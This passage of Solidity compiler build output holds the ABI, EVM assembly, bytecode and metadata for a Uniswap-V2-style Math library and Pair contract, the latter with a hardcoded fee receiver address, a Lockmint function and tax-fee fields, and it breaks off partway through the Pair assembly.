ts\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"mint\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidity\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"nonces\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"permit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"price0CumulativeLast\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"price1CumulativeLast\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"skim\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount0Out\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"amount1Out\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"swap\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"sync\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"token0\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"token1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/IPair.sol\":\"IPair\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/IPair.sol\":{\"keccak256\":\"0xdb92972f4ad91928bf2b838c35717718651f0501be334e6f30849c56fe99ff66\",\"urls\":[\"bzz-raw://e481899dee463be19aa61191acfef749034329127d372116ad504bad936f14e0\",\"dweb:/ipfs/QmeFYDk2NDiNjZt1yUDo8u1CuxYVdswc2mqWETaCzD1Cnv\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/Math.sol": {
				"Math": {
					"abi": [],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"src/Math.sol\":115:655  library Math {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n    /* \"--CODEGEN--\":132:134   */\n  0x0b\n    /* \"--CODEGEN--\":166:173   */\n  dup3\n    /* \"--CODEGEN--\":155:164   */\n  dup3\n    /* \"--CODEGEN--\":146:153   */\n  dup3\n    /* \"--CODEGEN--\":137:174   */\n  codecopy\n    /* \"--CODEGEN--\":255:262   */\n  dup1\n    /* \"--CODEGEN--\":249:263   */\n  mload\n    /* \"--CODEGEN--\":246:247   */\n  0x00\n    /* \"--CODEGEN--\":241:264   */\n  byte\n    /* \"--CODEGEN--\":235:239   */\n  0x73\n    /* \"--CODEGEN--\":232:265   */\n  eq\n    /* \"--CODEGEN--\":222:224   */\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":269:278   */\n  invalid\n    /* \"--CODEGEN--\":222:224   */\ntag_1:\n    /* \"--CODEGEN--\":293:302   */\n  address\n    /* \"--CODEGEN--\":290:291   */\n  0x00\n    /* \"--CODEGEN--\":283:303   */\n  mstore\n    /* \"--CODEGEN--\":323:327   */\n  0x73\n    /* \"--CODEGEN--\":314:321   */\n  dup2\n    /* \"--CODEGEN--\":306:328   */\n  mstore8\n    /* \"--CODEGEN--\":347:354   */\n  dup3\n    /* \"--CODEGEN--\":338:345   */\n  dup2\n    /* \"--CODEGEN--\":331:355   */\n  return\nstop\n\nsub_0: assembly {\n        /* \"src/Math.sol\":115:655  library Math {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa265627a7a72315820fc7f0ed7da51310c20495474da761ccfa7a4108ad019731a55039fe859d5947364736f6c63430005100032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60556023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a72315820fc7f0ed7da51310c20495474da761ccfa7a4108ad019731a55039fe859d5947364736f6c63430005100032",
							"opcodes": "PUSH1 0x55 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0xFC PUSH32 0xED7DA51310C20495474DA761CCFA7A4108AD019731A55039FE859D594736473 PUSH16 0x6C634300051000320000000000000000 ",
							"sourceMap": "115:540:5:-;;132:2:-1;166:7;155:9;146:7;137:37;255:7;249:14;246:1;241:23;235:4;232:33;222:2;;269:9;222:2;293:9;290:1;283:20;323:4;314:7;306:22;347:7;338;331:24"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea265627a7a72315820fc7f0ed7da51310c20495474da761ccfa7a4108ad019731a55039fe859d5947364736f6c63430005100032",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 0xFC PUSH32 0xED7DA51310C20495474DA761CCFA7A4108AD019731A55039FE859D594736473 PUSH16 0x6C634300051000320000000000000000 ",
							"sourceMap": "115:540:5:-;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17000",
								"executionCost": "94",
								"totalCost": "17094"
							},
							"internal": {
								"min(uint256,uint256)": "infinite",
								"sqrt(uint256)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 115,
									"end": 655,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 115,
									"end": 655,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 134,
									"name": "PUSH",
									"value": "B"
								},
								{
									"begin": 166,
									"end": 173,
									"name": "DUP3"
								},
								{
									"begin": 155,
									"end": 164,
									"name": "DUP3"
								},
								{
									"begin": 146,
									"end": 153,
									"name": "DUP3"
								},
								{
									"begin": 137,
									"end": 174,
									"name": "CODECOPY"
								},
								{
									"begin": 255,
									"end": 262,
									"name": "DUP1"
								},
								{
									"begin": 249,
									"end": 263,
									"name": "MLOAD"
								},
								{
									"begin": 246,
									"end": 247,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 241,
									"end": 264,
									"name": "BYTE"
								},
								{
									"begin": 235,
									"end": 239,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 232,
									"end": 265,
									"name": "EQ"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPI"
								},
								{
									"begin": 269,
									"end": 278,
									"name": "INVALID"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPDEST"
								},
								{
									"begin": 293,
									"end": 302,
									"name": "ADDRESS"
								},
								{
									"begin": 290,
									"end": 291,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 283,
									"end": 303,
									"name": "MSTORE"
								},
								{
									"begin": 323,
									"end": 327,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 314,
									"end": 321,
									"name": "DUP2"
								},
								{
									"begin": 306,
									"end": 328,
									"name": "MSTORE8"
								},
								{
									"begin": 347,
									"end": 354,
									"name": "DUP3"
								},
								{
									"begin": 338,
									"end": 345,
									"name": "DUP2"
								},
								{
									"begin": 331,
									"end": 355,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a72315820fc7f0ed7da51310c20495474da761ccfa7a4108ad019731a55039fe859d5947364736f6c63430005100032",
									".code": [
										{
											"begin": 115,
											"end": 655,
											"name": "PUSHDEPLOYADDRESS"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "ADDRESS"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "EQ"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "MSTORE"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "DUP1"
										},
										{
											"begin": 115,
											"end": 655,
											"name": "REVERT"
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/Math.sol\":\"Math\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/Math.sol\":{\"keccak256\":\"0x9e94097dd206ec6121005eb1e67e8347a2cfca90fb7d0b599522ce2f8a36c09b\",\"urls\":[\"bzz-raw://bfa9f239f212c94f413dc5ef4f5cabc853e789519bd9610a51fd7a2ea222d8fb\",\"dweb:/ipfs/QmR1YCU8VQ28BnqeRQ9WqSwqjxLzmtJYz2KqW2XQKjP9dR\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/Pair.sol": {
				"Pair": {
					"abi": [
						{
							"inputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Approval",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Burn",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"name": "Mint",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "sender",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0In",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1In",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount0Out",
									"type": "uint256"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "amount1Out",
									"type": "uint256"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Swap",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": false,
									"internalType": "uint112",
									"name": "reserve0",
									"type": "uint112"
								},
								{
									"indexed": false,
									"internalType": "uint112",
									"name": "reserve1",
									"type": "uint112"
								}
							],
							"name": "Sync",
							"type": "event"
						},
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"indexed": false,
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "Transfer",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "DOMAIN_SEPARATOR",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "FeeResiver",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "Lockmint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "liquidity",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "MINIMUM_LIQUIDITY",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "PERMIT_TYPEHASH",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "_frozenBalance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "allowance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "approve",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "balanceOf",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "burn",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "decimals",
							"outputs": [
								{
									"internalType": "uint8",
									"name": "",
									"type": "uint8"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "factory",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "getReserves",
							"outputs": [
								{
									"internalType": "uint112",
									"name": "_reserve0",
									"type": "uint112"
								},
								{
									"internalType": "uint112",
									"name": "_reserve1",
									"type": "uint112"
								},
								{
									"internalType": "uint32",
									"name": "_blockTimestampLast",
									"type": "uint32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "_token0",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "_token1",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "_taxfee",
									"type": "uint256"
								}
							],
							"name": "initialize",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "kLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "mint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "liquidity",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "name",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"name": "nonces",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "owner",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "spender",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "deadline",
									"type": "uint256"
								},
								{
									"internalType": "uint8",
									"name": "v",
									"type": "uint8"
								},
								{
									"internalType": "bytes32",
									"name": "r",
									"type": "bytes32"
								},
								{
									"internalType": "bytes32",
									"name": "s",
									"type": "bytes32"
								}
							],
							"name": "permit",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "price0CumulativeLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "price1CumulativeLast",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								}
							],
							"name": "skim",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "uint256",
									"name": "amount0Out",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1Out",
									"type": "uint256"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "swap",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "symbol",
							"outputs": [
								{
									"internalType": "string",
									"name": "",
									"type": "string"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "sync",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "taxfee",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "token0",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "token1",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "totalSupply",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transfer",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "from",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "to",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "value",
									"type": "uint256"
								}
							],
							"name": "transferFrom",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"src/Pair.sol\":226:18384  contract Pair is IPair, ERC20 {... */\n  mstore(0x40, 0x80)\n    /* \"src/Pair.sol\":325:395  address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n  0x06\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n    /* \"src/Pair.sol\":353:395  0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n  0x9e94ee69f3cdcd5e74e05563736e4679da6db44c\n    /* \"src/Pair.sol\":325:395  address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n  or\n  swap1\n  sstore\n  0x01\n    /* \"src/Pair.sol\":1114:1139  uint private unlocked = 1 */\n  0x0f\n  sstore\n    /* \"src/Pair.sol\":2358:2416  constructor() public {... */\n  callvalue\n    /* \"--CODEGEN--\":5:7   */\n  dup1\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n  pop\n    /* \"src/ERC20.sol\":1203:1336  keccak256(... */\n  mload(0x40)\n    /* \"src/ERC20.sol\":1107:1114  chainid */\n  chainid\n  swap1\n    /* \"src/ERC20.sol\":1203:1336  keccak256(... */\n  dup1\n  0x52\n  data_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f\n  dup3\n  codecopy\n  0x40\n  dup1\n  mload\n  swap2\n  dup3\n  swap1\n  sub\n  0x52\n  add\n  dup3\n  keccak256\n    /* \"src/ERC20.sol\":1370:1374  name */\n  dup3\n  dup3\n  add\n  dup3\n  mstore\n  0x07\n  dup1\n  dup5\n  mstore\n  shl(0xc8, 0x4b4243204c5073)\n  0x20\n  swap5\n  dup6\n  add\n  mstore\n    /* \"src/ERC20.sol\":1404:1414  bytes(\"1\") */\n  dup3\n  mload\n  dup1\n  dup5\n  add\n  dup5\n  mstore\n  0x01\n  dup2\n  mstore\n  shl(0xf8, 0x31)\n  swap1\n  dup6\n  add\n  mstore\n    /* \"src/ERC20.sol\":1175:1485  abi.encode(... */\n  dup3\n  mload\n  dup1\n  dup6\n  add\n  swap3\n  swap1\n  swap3\n  mstore\n    /* \"src/ERC20.sol\":1354:1376  keccak256(bytes(name)) */\n  0x6a36d39f32c2225411d16c8f56813b9117e6eb8bf3d2893c5fc62411565cfcfe\n    /* \"src/ERC20.sol\":1175:1485  abi.encode(... */\n  dup3\n  dup5\n  add\n  mstore\n    /* \"src/ERC20.sol\":1394:1415  keccak256(bytes(\"1\")) */\n  0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6\n    /* \"src/ERC20.sol\":1175:1485  abi.encode(... */\n  0x60\n  dup4\n  add\n  mstore\n  0x80\n  dup3\n  add\n  swap6\n  swap1\n  swap6\n  mstore\n    /* \"src/ERC20.sol\":1466:1470  this */\n  address\n    /* \"src/ERC20.sol\":1175:1485  abi.encode(... */\n  0xa0\n  dup1\n  dup4\n  add\n  swap2\n  swap1\n  swap2\n  mstore\n  dup3\n  mload\n    /* \"--CODEGEN--\":26:47   */\n  dup1\n  dup4\n  sub\n    /* \"--CODEGEN--\":22:54   */\n  swap1\n  swap2\n  add\n    /* \"--CODEGEN--\":6:55   */\n  dup2\n  mstore\n    /* \"src/ERC20.sol\":1175:1485  abi.encode(... */\n  0xc0\n  swap1\n  swap2\n  add\n  swap1\n  swap2\n  mstore\n    /* \"src/ERC20.sol\":1152:1495  keccak256(... */\n  dup1\n  mload\n  swap2\n  add\n  keccak256\n    /* \"src/ERC20.sol\":1133:1149  DOMAIN_SEPARATOR */\n  0x04\n    /* \"src/ERC20.sol\":1133:1495  DOMAIN_SEPARATOR = keccak256(... */\n  sstore\n  pop\n    /* \"src/Pair.sol\":2389:2409  factory = msg.sender */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n    /* \"src/Pair.sol\":2399:2409  msg.sender */\n  caller\n    /* \"src/Pair.sol\":2389:2409  factory = msg.sender */\n  or\n  swap1\n  sstore\n    /* \"src/Pair.sol\":226:18384  contract Pair is IPair, ERC20 {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\ndata_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f 454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429\n\nsub_0: assembly {\n        /* \"src/Pair.sol\":226:18384  contract Pair is IPair, ERC20 {... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_1:\n        /* \"src/Pair.sol\":226:18384  contract Pair is IPair, ERC20 {... */\n      pop\n   